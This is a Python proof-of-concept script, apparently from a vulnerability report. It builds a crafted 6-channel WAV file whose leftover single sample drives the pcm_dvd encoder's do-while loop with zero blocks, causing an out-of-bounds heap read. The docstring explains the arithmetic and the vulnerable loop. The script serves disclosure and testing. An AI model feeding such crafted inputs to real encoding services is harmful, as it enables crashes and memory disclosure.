#!/usr/bin/env python3
"""
PoC generator for VULN-001: do-while-blocks-zero OOB heap read in pcm_dvd encoder.

For 6-channel (5.1) S32 audio at 48kHz:
  - bits_per_coded_sample = 24 (quant=2, S32 maps to 24-bit output)
  - block_size = 4 * 6 * 24/8 = 72 bytes
  - samples_per_block = 4
  - groups_per_block = 6
  - frame_size = FFALIGN(2008/72, 4) = FFALIGN(27, 4) = 28
  - bit_rate = 6 * 3 * 8 * 48000 = 6,912,000 bps (within 9,800,000 limit)

Trigger: provide 29 total samples (= 28 + 1).
  Frame 1: nb_samples=28, blocks=28/4=7 -> normal encode
  Frame 2: nb_samples=1,  blocks=1/4=0  -> do-while runs with blocks=0 -> OOB!

The do-while (lines 153-164 of pcm-dvdenc.c):
    do {
        for (int i = s->groups_per_block; i; i--) {
            bytestream2_put_be16(&pb, src32[0] >> 16);
            ...
            bytestream2_put_byte(&pb, (uint8_t)((*src32++) >> 8));
            ...  // advances src32 by 4 per group * 6 groups = 24 int32 per block
        }
    } while (--blocks);

When blocks=0: first iteration reads 24 int32s past the allocated frame buffer.
Then --blocks wraps to -1 (non-zero), causing ~2^32 more iterations of OOB reads.

ASAN should catch the heap-buffer-overflow on the very first OOB read.
"""
import struct
import os

# Parameters
channels = 6
sample_rate = 48000       # Must be 48kHz for 6ch S32 (96kHz exceeds bitrate limit)
bits_per_sample = 32      # S32LE input WAV
num_samples = 29          # 28 fills one complete frame; the 1 leftover triggers the bug

bytes_per_sample = bits_per_sample // 8
block_align = channels * bytes_per_sample        # 6*4 = 24
byte_rate = sample_rate * block_align             # 48000*24 = 1,152,000
data_size = num_samples * block_align             # 29*24 = 696

riff_chunk_size = 36 + data_size                  # size after "RIFF" and size field

wav_data = bytearray()
wav_data += b'RIFF'
wav_data += struct.pack('<I', riff_chunk_size)
wav_data += b'WAVE'
wav_data += b'fmt '
wav_data += struct.pack('<I', 16)                 # fmt chunk size (PCM = 16)
wav_data += struct.pack('<H', 1)                  # PCM format
wav_data += struct.pack('<H', channels)           # channels
wav_data += struct.pack('<I', sample_rate)        # sample rate
wav_data += struct.pack('<I', byte_rate)          # byte rate
wav_data += struct.pack('<H', block_align)        # block align
wav_data += struct.pack('<H', bits_per_sample)    # bits per sample
wav_data += b'data'
wav_data += struct.pack('<I', data_size)

# Fill with recognizable non-zero values so OOB reads are clearly visible
for i in range(num_samples * channels):
    wav_data += struct.pack('<i', 0x01020304)

outfile = 'vuln_001_input.wav'
with open(outfile, 'wb') as f:
    f.write(wav_data)

print(f"Generated {outfile}: {len(wav_data)} bytes")
print(f"  {num_samples} samples, {channels} channels, {sample_rate} Hz, S32LE")
print(f"  Frame 1 (28 samples): blocks=7, normal")
print(f"  Frame 2 (1 sample):   blocks=0, triggers do-while OOB bug")
